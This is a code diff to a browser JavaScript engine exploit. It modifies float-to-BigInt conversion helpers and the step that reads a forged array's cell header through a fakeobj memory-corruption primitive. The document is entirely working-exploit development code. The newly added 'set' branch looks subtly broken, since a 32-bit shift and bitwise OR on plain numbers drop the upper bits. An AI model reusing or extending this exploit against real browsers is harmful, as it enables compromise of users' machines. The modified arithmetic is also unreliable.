@@ -37,11 +37,20 @@ var qwordAsFloat = qword => {
           let doubleArrayCellHeader = 0x0108230700000000n;
           let f = new Float64Array(1);
           let u = new Uint32Array(f.buffer);
-          function float2bigint(v) {
+          function float2bigint(v,set) {
+          if (set) {
+          f[0] = v;
+          return (u[0] | u[1] << 32);
+          }
             f[0] = v;
             return BigInt(u[0]) | (BigInt(u[1]) << 32n);
           }
-          function bigint2float(v) {
+          function bigint2float(v,set) {
+            if(set) {
+            u[0] = v & 0xffffffff
+            u[1] = v >> 32;
+            return f[0]
+            }
             u[0] = Number(v & 0xffffffffn);
             u[1] = Number(v >> 32n);
             return f[0];
@@ -117,7 +126,7 @@ var qwordAsFloat = qword => {
             let fakeArr = fakeobj(addr + 0x10n);
 
             // subtract off the incref
-            doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
+            doubleArrayCellHeader = float2bigint(bigint2float(float2bigint(fakeArr[0]) - 0x1n),true);
             port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
 
             // fix broken cell header
